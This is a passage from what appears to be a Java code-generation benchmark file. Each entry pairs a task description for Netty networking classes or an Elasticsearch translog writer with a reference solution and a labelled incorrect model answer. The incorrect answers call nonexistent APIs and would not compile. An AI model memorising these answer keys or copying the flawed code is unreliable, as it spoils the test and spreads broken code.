}\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 155,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a Docker daemon, with support for SSL/TLS encryption and timeout handling.\n\nClass Description: The NettyTcpClient class provides functionality to establish and manage TCP connections to a Docker daemon using Netty framework. It handles connection initialization, SSL/TLS configuration, timeout management, and graceful shutdown.\n\nAttributes:\n- bootstrap: Bootstrap - Netty's client bootstrap for connection configuration\n- eventLoopGroup: EventLoopGroup - Manages client-side I/O threads\n- connectTimeout: Integer - Connection timeout in milliseconds\n- readTimeout: Integer - Read operation timeout in milliseconds\n- threadPrefix: String - Prefix for Netty thread names\n\nMethods:\n- init(DockerClientConfig dockerClientConfig) -> void - Initializes the Netty client with Docker configuration\n- connect(DockerClientConfig dockerClientConfig) -> DuplexChannel - Establishes connection to Docker daemon with SSL support\n- initSsl(DockerClientConfig dockerClientConfig) -> SslHandler - Configures SSL/TLS for the connection\n- enableHostNameVerification(SSLParameters sslParameters) -> SSLParameters - Enables hostname verification in SSL parameters\n- close() -> void - Shuts down the client gracefully\n- configure(T channel) -> T - Configures channel timeouts and handlers\n- ReadTimeoutHandler() -> void - Inner class handling read timeout events",
    "Canonical_solution": "import com.github.dockerjava.core.DockerClientConfig;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelConfig;\nimport io.netty.channel.ChannelFactory;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.DuplexChannel;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpContentDecompressor;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.concurrent.DefaultThreadFactory;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketTimeoutException;\nimport java.security.Security;\nimport java.util.Objects;\nimport java.util.concurrent.TimeUnit;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.SSLParameters;\n\npublic class NettyTcpClient {\n\n    private static String threadPrefix = \"dockerjava-netty\";\n    private Bootstrap bootstrap;\n    private EventLoopGroup eventLoopGroup;\n    private Integer connectTimeout;\n    private Integer readTimeout;\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        bootstrap = new Bootstrap();\n        eventLoopGroup = new NioEventLoopGroup(0, new DefaultThreadFactory(threadPrefix));\n\n        InetAddress addr = InetAddress.getLoopbackAddress();\n        final SocketAddress proxyAddress = new InetSocketAddress(addr, 8008);\n\n        Security.addProvider(new BouncyCastleProvider());\n\n        ChannelFactory<NioSocketChannel> factory = () -> configure(new NioSocketChannel());\n\n        bootstrap.group(eventLoopGroup).channelFactory(factory)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(final SocketChannel channel) throws Exception {\n                        channel.pipeline().addLast(new HttpClientCodec());\n                        channel.pipeline().addLast(new HttpContentDecompressor());\n                    }\n                });\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) throws InterruptedException {\n        String host = dockerClientConfig.getDockerHost().getHost();\n        int port = dockerClientConfig.getDockerHost().getPort();\n\n        if (port == -1) {\n            throw new RuntimeException(\"no port configured for \" + host);\n        }\n\n        final DuplexChannel channel = (DuplexChannel) bootstrap.connect(host, port).sync().channel();\n\n        final SslHandler ssl = initSsl(dockerClientConfig);\n\n        if (ssl != null) {\n            channel.pipeline().addFirst(ssl);\n            ssl.sslCloseFuture().addListener(future -> channel.eventLoop().execute(channel::close));\n        }\n\n        return channel;\n    }\n\n    private SslHandler initSsl(DockerClientConfig dockerClientConfig) {\n        SslHandler ssl = null;\n\n        try {\n            String host = dockerClientConfig.getDockerHost().getHost();\n            int port = dockerClientConfig.getDockerHost().getPort();\n\n            final SSLConfig sslConfig = dockerClientConfig.getSSLConfig();\n\n            if (sslConfig != null && sslConfig.getSSLContext() != null) {\n                SSLEngine engine = sslConfig.getSSLContext().createSSLEngine(host, port);\n                engine.setUseClientMode(true);\n                engine.setSSLParameters(enableHostNameVerification(engine.getSSLParameters()));\n                ssl = new SslHandler(engine);\n            }\n\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n\n        return ssl;\n    }\n\n    public SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        return sslParameters;\n    }\n\n    public void close() throws IOException {\n        Objects.requireNonNull(eventLoopGroup, \"Factory not initialized. You probably forgot to call init()!\");\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private <T extends Channel> T configure(T channel) {\n        ChannelConfig channelConfig = channel.config();\n\n        if (connectTimeout != null) {\n            channelConfig.setConnectTimeoutMillis(connectTimeout);\n        }\n        if (readTimeout != null) {\n            channel.pipeline().addLast(\"readTimeoutHandler\", new ReadTimeoutHandler());\n        }\n\n        return channel;\n    }\n\n    private final class ReadTimeoutHandler extends IdleStateHandler {\n        private boolean alreadyTimedOut;\n\n        ReadTimeoutHandler() {\n            super(readTimeout, 0, 0, TimeUnit.MILLISECONDS);\n        }\n\n        @Override\n        protected synchronized void channelIdle(ChannelHandlerContext ctx, IdleStateEvent evt) throws Exception {\n            assert evt.state() == IdleState.READER_IDLE;\n            final Channel channel = ctx.channel();\n            if (channel == null || !channel.isActive() || alreadyTimedOut) {\n                return;\n            }\n            DockerClientConfig dockerClientConfig = getDockerClientConfig();\n            final Object dockerAPIEndpoint = dockerClientConfig.getDockerHost();\n            final String msg = \"Read timed out: No data received within \" + readTimeout\n                    + \"ms.  Perhaps the docker API (\" + dockerAPIEndpoint\n                    + \") is not responding normally, or perhaps you need to increase the readTimeout value.\";\n            final Exception ex = new SocketTimeoutException(msg);\n            ctx.fireExceptionCaught(ex);\n            alreadyTimedOut = true;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private final Bootstrap bootstrap;\n    private final EventLoopGroup eventLoopGroup;\n    private final int connectTimeout;\n    private final int readTimeout;\n    private final String threadPrefix;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup(1, new ThreadFactoryBuilder().setNameFormat(threadPrefix + \"-%d\").build());\n        this.bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                 .channel(NioSocketChannel.class)\n                 .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, connectTimeout)\n                 .option(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void init(DockerClientConfig dockerClientConfig) {\n        this.connectTimeout = dockerClientConfig.getConnectTimeout();\n        this.readTimeout = dockerClientConfig.getReadTimeout();\n        this.threadPrefix = dockerClientConfig.getThreadPrefix();\n\n        SslHandler sslHandler = initSsl(dockerClientConfig);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ChannelPipeline p = ch.pipeline();\n                p.addLast(sslHandler);\n                p.addLast(new ReadTimeoutHandler());\n                p.addLast(new DockerClientHandler());\n            }\n        });\n    }\n\n    private SslHandler initSsl(DockerClientConfig dockerClientConfig) {\n        SSLParameters sslParameters = new SSLParameters();\n        enableHostNameVerification(sslParameters);\n        SslContext sslContext = SslContextBuilder.forClient()\n                .sslProvider(SslProvider.OPENSSL)\n                .trustManager(dockerClientConfig.getTrustStore())\n                .keyManager(dockerClientConfig.getKeyStore())\n                .sslParameters(sslParameters)\n                .build();\n        return sslContext.newHandler(new SslContext());\n    }\n\n    private SSLParameters enableHostNameVerification(SSLParameters sslParameters) {\n        sslParameters.setEndpointIdentificationAlgorithm(\"HTTPS\");\n        return sslParameters;\n    }\n\n    public DuplexChannel connect(DockerClientConfig dockerClientConfig) {\n        ChannelFuture future = bootstrap.connect(dockerClientConfig.getHost(), dockerClientConfig.getPort());\n        future.syncUninterruptibly();\n        Channel channel = future.channel();\n        return (DuplexChannel) channel;\n    }\n\n    public void close() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    private class ReadTimeoutHandler extends ChannelInboundHandlerAdapter {\n        private long lastReadTime = System.currentTimeMillis();\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            lastReadTime = System.currentTimeMillis();\n            ctx.fireChannelRead(msg);\n        }\n\n        @Override\n        public void channelIdle(ChannelHandlerContext ctx, ChannelId channelId, IdleState event) {\n            if (event == IdleState.READER_IDLE) {\n                ctx.fireException(new ReadTimeoutException(\"Read timeout occurred\"));\n            }\n        }\n    }\n\n    public <T extends Channel> T configure(T channel) {\n        channel.config().setOptions(\n            Collections.singletonMap(ChannelOption.READ_TIMEOUT_MILLIS, readTimeout)\n        );\n        return channel;\n    }\n}"
  },
  {
    "Task_id": 157,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server, send periodic messages, and handle graceful shutdown.\n\nClass Description: The MyClient class represents a Netty-based TCP client that connects to a specified host and port, sends periodic messages containing Chinese poetry, and manages network resources properly.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- Constructor: MyClient(String host, int port) -> void - Initializes the client with target host and port information\n- run: run() -> void - Main method that:\n  1. Initializes Netty client components\n  2. Establishes TCP connection\n  3. Periodically sends message objects containing Chinese poetry\n  4. Handles graceful shutdown of network resources\n  5. Throws InterruptedException if interrupted during operation",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.nio.charset.Charset;\n\npublic class MyClient {\n\n    private String host;\n    private int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"codec\", new MyCodec());\n                    ch.pipeline().addLast(new MyClientHandler());\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n\n            while (true) {\n                Msg msg = new Msg();\n                MsgHeader msgHeader = new MsgHeader();\n                msgHeader.setMsgType(MsgType.EMGW_LOGIN_REQ.getValue());\n                String body = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\u4e3e\u5934\u671b\u660e\u6708\uff0c\u4f4e\u5934\u601d\u6545\u4e61\u3002\";\n\n                byte[] bodyBytes = body.getBytes(Charset.forName(\"utf-8\"));\n                int bodySize = bodyBytes.length;\n                msgHeader.setLen(bodySize);\n                msg.setMsgHeader(msgHeader);\n                msg.setBody(body);\n\n                f.channel().writeAndFlush(msg);\n                Thread.sleep(2000);\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class MyClient {\n    private final String host;\n    private final int port;\n\n    public MyClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void run() throws InterruptedException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                    .channel(NioSocketChannel.class)\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new StringEncoder());\n                            pipeline.addLast(new StringDecoder());\n                            pipeline.addLast(new MyClientHandler());\n                        }\n                    });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            Channel channel = future.channel();\n\n            ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();\n            scheduler.scheduleAtFixedRate(() -> {\n                try {\n                    String poetry = \"\u5e8a\u524d\u660e\u6708\u5149\uff0c\u7591\u662f\u5730\u4e0a\u971c\u3002\";\n                    channel.writeAndFlush(poetry);\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n            }, 0, 5, TimeUnit.SECONDS);\n\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private class MyClientHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 16,
    "Instruction": "Task Description: Create a Java class that implements a transactional log writer for Elasticsearch, handling file operations using Java NIO's FileChannel for efficient I/O operations. The class should manage writing operations, buffer management, and resource cleanup.\n\nClass Description: TranslogWriter is a transactional log writer that extends BaseTranslogReader and implements Closeable. It provides functionality to write operations to a log file using FileChannel, manage buffers, and handle synchronization. The class includes mechanisms for checkpointing, thread-safe operations, and resource management.\n\nAttributes:\n- channel: [FileChannel] - The main file channel for writing transaction log entries\n- checkpointChannel: [FileChannel] - File channel for writing checkpoint information\n- checkpointPath: [Path] - Path to the checkpoint file\n- bigArrays: [BigArrays] - Helper for managing large arrays\n- totalOffset: [long] - Current offset in the log file\n- closed: [AtomicBoolean] - Flag indicating whether the writer is closed\n- writeLock: [ReleasableLock] - Lock for thread-safe write operations\n- syncLock: [Object] - Synchronization lock object\n- buffer: [ReleasableBytesStreamOutput] - Buffer for holding data before writing\n- globalCheckpointSupplier: [LongSupplier] - Supplier for global checkpoint information\n- minTranslogGenerationSupplier: [LongSupplier] - Supplier for minimum translog generation\n- persistedSequenceNumberConsumer: [LongConsumer] - Consumer for persisted sequence numbers\n\nMethods:\n- TranslogWriter([ShardId, Checkpoint, FileChannel, FileChannel, Path, Path, ByteSizeValue, LongSupplier, LongSupplier, TranslogHeader, TragicExceptionHolder, LongConsumer, BigArrays]) -> [void] - Constructor that initializes the translog writer with all required components\n- writeAndReleaseOps([ReleasableBytesReference]) -> [void] - Writes the given bytes reference to the file and releases it\n- writeToFile([ByteBuffer]) -> [void] - Helper method that writes buffer contents to the file channel\n- readBytes([ByteBuffer, long]) -> [void] - Reads bytes from the specified position into the target buffer\n- writeCheckpoint([FileChannel, Path, Checkpoint]) -> [void] - Static helper method to write checkpoint information\n- close() -> [void] - Closes all resources and marks the writer as closed",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.function.LongConsumer;\nimport java.util.function.LongSupplier;\n\nimport org.apache.lucene.store.AlreadyClosedException;\nimport org.apache.lucene.util.BytesRef;\nimport org.apache.lucene.util.BytesRefIterator;\nimport org.elasticsearch.common.bytes.BytesArray;\nimport org.elasticsearch.common.bytes.BytesReference;\nimport org.elasticsearch.common.bytes.ReleasableBytesReference;\nimport org.elasticsearch.common.io.Channels;\nimport org.elasticsearch.common.io.DiskIoBufferPool;\nimport org.elasticsearch.common.lease.Releasables;\nimport org.elasticsearch.common.unit.ByteSizeValue;\nimport org.elasticsearch.common.util.BigArrays;\nimport org.elasticsearch.common.util.concurrent.ReleasableLock;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\nimport org.elasticsearch.index.shard.ShardId;\n\nimport io.crate.common.SuppressForbidden;\nimport io.crate.common.io.IOUtils;\n\npublic class TranslogWriter extends BaseTranslogReader implements Closeable {\n\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private volatile long totalOffset;\n    private final AtomicBoolean closed = new AtomicBoolean(false);\n    private final ReleasableLock writeLock = new ReleasableLock(new ReentrantLock());\n    private final Object syncLock = new Object();\n    private ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(\n        final ShardId shardId,\n        final Checkpoint initialCheckpoint,\n        final FileChannel channel,\n        final FileChannel checkpointChannel,\n        final Path path,\n        final Path checkpointPath,\n        final ByteSizeValue bufferSize,\n        final LongSupplier globalCheckpointSupplier,\n        LongSupplier minTranslogGenerationSupplier,\n        TranslogHeader header,\n        final TragicExceptionHolder tragedy,\n        final LongConsumer persistedSequenceNumberConsumer,\n        final BigArrays bigArrays) throws IOException {\n        super(initialCheckpoint.generation, channel, path, header);\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = initialCheckpoint.offset;\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    private void writeAndReleaseOps(ReleasableBytesReference toWrite) throws IOException {\n        try (ReleasableBytesReference toClose = toWrite) {\n            assert writeLock.isHeldByCurrentThread();\n            ByteBuffer ioBuffer = DiskIoBufferPool.getIoBuffer();\n\n            BytesRefIterator iterator = toWrite.iterator();\n            BytesRef current;\n            while ((current = iterator.next()) != null) {\n                int currentBytesConsumed = 0;\n                while (currentBytesConsumed != current.length) {\n                    int nBytesToWrite = Math.min(current.length - currentBytesConsumed, ioBuffer.remaining());\n                    ioBuffer.put(current.bytes, current.offset + currentBytesConsumed, nBytesToWrite);\n                    currentBytesConsumed += nBytesToWrite;\n                    if (ioBuffer.hasRemaining() == false) {\n                        ioBuffer.flip();\n                        writeToFile(ioBuffer);\n                        ioBuffer.clear();\n                    }\n                }\n            }\n            ioBuffer.flip();\n            writeToFile(ioBuffer);\n        }\n    }\n\n    @SuppressForbidden(reason = \"Channel#write\")\n    private void writeToFile(ByteBuffer ioBuffer) throws IOException {\n        while (ioBuffer.remaining() > 0) {\n            channel.write(ioBuffer);\n        }\n    }\n\n    @Override\n    protected void readBytes(ByteBuffer targetBuffer, long position) throws IOException {\n        try {\n            if (position + targetBuffer.remaining() > getWrittenOffset()) {\n                writeBufferedOps(position + targetBuffer.remaining(), true);\n            }\n        } catch (final Exception ex) {\n            closeWithTragicEvent(ex);\n            throw ex;\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, targetBuffer);\n    }\n\n    private static void writeCheckpoint(\n        final FileChannel fileChannel,\n        final Path checkpointFile,\n        final Checkpoint checkpoint) throws IOException {\n        Checkpoint.write(fileChannel, checkpointFile, checkpoint);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            synchronized (this) {\n                Releasables.closeIgnoringException(buffer);\n                buffer = null;\n            }\n            IOUtils.close(checkpointChannel, channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class TranslogWriter extends BaseTranslogReader implements Closeable {\n    private final FileChannel channel;\n    private final FileChannel checkpointChannel;\n    private final Path checkpointPath;\n    private final BigArrays bigArrays;\n    private long totalOffset;\n    private final AtomicBoolean closed;\n    private final ReleasableLock writeLock;\n    private final Object syncLock;\n    private final ReleasableBytesStreamOutput buffer;\n    private final LongSupplier globalCheckpointSupplier;\n    private final LongSupplier minTranslogGenerationSupplier;\n    private final LongConsumer persistedSequenceNumberConsumer;\n\n    public TranslogWriter(ShardId shardId, Checkpoint checkpoint, FileChannel channel, FileChannel checkpointChannel, Path checkpointPath, Path dataPath, ByteSizeValue bufferSize, LongSupplier globalCheckpointSupplier, LongSupplier minTranslogGenerationSupplier, TranslogHeader header, TragicExceptionHolder tragicExceptionHolder, LongConsumer persistedSequenceNumberConsumer, BigArrays bigArrays) {\n        this.channel = channel;\n        this.checkpointChannel = checkpointChannel;\n        this.checkpointPath = checkpointPath;\n        this.bigArrays = bigArrays;\n        this.totalOffset = 0;\n        this.closed = new AtomicBoolean(false);\n        this.writeLock = new ReleasableLock();\n        this.syncLock = new Object();\n        this.buffer = new ReleasableBytesStreamOutput();\n        this.globalCheckpointSupplier = globalCheckpointSupplier;\n        this.minTranslogGenerationSupplier = minTranslogGenerationSupplier;\n        this.persistedSequenceNumberConsumer = persistedSequenceNumberConsumer;\n    }\n\n    public void writeAndReleaseOps(ReleasableBytesReference bytesRef) {\n        writeLock.acquire();\n        try {\n            buffer.writeBytes(bytesRef);\n            writeToFile(buffer.getByteBuffer());\n            buffer.release();\n        } finally {\n            writeLock.release();\n        }\n    }\n\n    private void writeToFile(ByteBuffer buffer) throws IOException {\n        channel.write(buffer);\n        totalOffset += buffer.remaining();\n    }\n\n    private void readBytes(ByteBuffer target, long position) throws IOException {\n        channel.read(target, position);\n    }\n\n    private static void writeCheckpoint(FileChannel channel, Path path, Checkpoint checkpoint) throws IOException {\n        byte[] data = new byte[checkpoint.size()];\n        checkpoint.writeTo(data);\n        channel.write(ByteBuffer.wrap(data));\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed.getAndSet(true)) {\n            return;\n        }\n        try {\n            channel.close();\n            checkpointChannel.close();\n        } catch (IOException e) {\n            throw new IOException(\"Failed to close translog writer\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 160,
    "Instruction": "Task Description: Implement a Java class that establishes a TCP server using Netty framework to handle WebSocket connections, manage client protocols, and process various commands and binary messages.\n\nClass Description: LocalServer is a Netty-based TCP server that handles WebSocket connections, manages client protocols, and processes text/binary messages. It maintains a list of active protocols and delegates command execution to connected clients.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - Maintains active client protocols and their associated connections\n- logger: Logger - Logging instance for server events and errors\n\nMethods:\n- LocalServer(int port) -> void - Constructor that initializes the server with specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server with boss/worker groups, configures channel options and handlers, and binds to the specified port\n- LocalServerWebsocketEventImp (inner class) - Handles WebSocket events including connection, disconnection, and message processing\n\nLocalServerWebsocketEventImp Methods:\n- onConnect(ChannelHandlerContext ctx) -> void - Handles new WebSocket connections\n- onDisconnect(ChannelHandlerContext ctx) -> void - Handles client disconnections and cleans up associated protocols\n- onTextMessage(ChannelHandlerContext ctx, String text) -> void - Processes incoming text messages and executes corresponding commands\n- onBinaryMessage(ChannelHandlerContext ctx, byte[] data) -> void - Handles binary file uploads and processes file chunks\n- initLocalClient(ChannelHandlerContext ctx, Command command) -> void - Initializes a new client protocol for device communication\n- executeCommand(ChannelHandlerContext ctx, Command command) -> void - Executes commands on the appropriate protocol instance",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport com.yeetor.androidcontrol.client.LocalClient;\nimport com.yeetor.androidcontrol.message.BinaryMessage;\nimport com.yeetor.androidcontrol.message.FileMessage;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.apache.log4j.Logger;\n\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class LocalServer extends BaseServer {\n    private static Logger logger = Logger.getLogger(LocalServer.class);\n    \n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public LocalServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup).\n                channel(NioServerSocketChannel.class).\n                childOption(ChannelOption.SO_KEEPALIVE, true).\n                childHandler(new ChildChannel(new LocalServerWebsocketEventImp()));\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private class LocalServerWebsocketEventImp extends WebsocketEvent {\n\n        @Override\n        public void onConnect(ChannelHandlerContext ctx) {\n            logger.info(\"Websocket new connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onDisconnect(ChannelHandlerContext ctx) {\n            for (Protocol protocol : protocolList) {\n                if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                    protocol.broswerDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n\n                if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                    protocol.clientDisconnect();\n                    protocol.close();\n                    protocolList.remove(protocol);\n                    break;\n                }\n            }\n            logger.info(\"Websocket lost connection!\" + ctx.channel().remoteAddress());\n        }\n\n        @Override\n        public void onTextMessage(ChannelHandlerContext ctx, String text) {\n            Command command = Command.ParseCommand(text);\n            if (command != null) {\n                switch (command.getSchem()) {\n                    case WAIT:\n                        initLocalClient(ctx, command);\n                        break;\n                    case START:\n                    case WAITTING:\n                    case TOUCH:\n                    case KEYEVENT:\n                    case INPUT:\n                    case PUSH:\n                        executeCommand(ctx, command);\n                        break;\n                    case SHOT:\n                        sendShot(ctx, command);\n                        break;\n                    case DEVICES:\n                        sendDevicesJson(ctx);\n                        break;\n                }\n            }\n        }\n\n        @Override\n        public void onBinaryMessage(ChannelHandlerContext ctx, byte[] data) {\n            int headlen = (data[1] & 0xFF) << 8 | (data[0] & 0xFF);\n            String infoJSON = new String(data, 2, headlen);\n            BinaryMessage message = BinaryMessage.parse(infoJSON);\n\n            if (message.getType().equals(\"file\")) {\n                FileMessage fileMessage = (FileMessage) message;\n                File file = Constant.getTmpFile(fileMessage.name);\n                if (fileMessage.offset == 0 && file.exists()) {\n                    file.delete();\n                }\n                try {\n                    FileOutputStream os = new FileOutputStream(file, true);\n                    byte[] bs = Arrays.copyOfRange(data, 2 + headlen, data.length);\n                    os.write(bs);\n                    os.close();\n                } catch (Exception e) {\n                    e.printStackTrace();\n                }\n                if (fileMessage.offset + fileMessage.packagesize == fileMessage.filesize) {\n                    ctx.channel().writeAndFlush(new TextWebSocketFrame(\"message://upload file success\"));\n                }\n            }\n        }\n\n        void initLocalClient(final ChannelHandlerContext ctx, Command command) {\n            String sn = command.getString(\"sn\", null);\n            String key = command.getString(\"key\", null);\n\n            if (StringUtils.isEmpty(sn)) {\n                AdbDevice iDevice = AdbServer.server().getFirstDevice();\n                if (iDevice == null) {\n                    ctx.channel().close();\n                    return;\n                }\n                sn = iDevice.getIDevice().getSerialNumber();\n            }\n\n            JSONObject obj = new JSONObject();\n            obj.put(\"sn\", sn);\n            obj.put(\"key\", key);\n\n            ctx.channel().writeAndFlush(new TextWebSocketFrame(\"open://\" + obj.toJSONString()));\n\n            Protocol protocol = new Protocol();\n            protocol.setSn(sn);\n            protocol.setKey(key);\n            protocol.setBroswerSocket(ctx);\n            protocolList.add(protocol);\n\n            LocalClient localClient = new LocalClient(protocol);\n            protocol.setLocalClient(localClient);\n        }\n\n        void executeCommand(ChannelHandlerContext ctx, Command command) {\n            Protocol protocol = null;\n            for (Protocol p : protocolList) {\n                if (p.getBroswerSocket() != null && p.getBroswerSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n                if (p.getClientSocket() != null && p.getClientSocket() == ctx) {\n                    protocol = p;\n                    break;\n                }\n            }\n            if (protocol != null) {\n                protocol.getLocalClient().executeCommand(ctx, command);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class LocalServer {\n    private int port;\n    private List<Protocol> protocolList;\n    private Logger logger;\n\n    public LocalServer(int port) {\n        this.port = port;\n        this.protocolList = new ArrayList<>();\n        this.logger = LoggerFactory.getLogger(LocalServer.class);\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(\n                         new HttpServerCodec(),\n                         new HttpObjectAggregator(65536),\n                         new WebSocketServerProtocolHandler(\"/websocket\"),\n                         new LocalServerWebsocketEventImp()\n                     );\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            logger.error(\"Server interrupted\", e);\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    class LocalServerWebsocketEventImp extends SimpleChannelInboundHandler<WebSocketFrame> {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            onConnect(ctx);\n        }\n\n        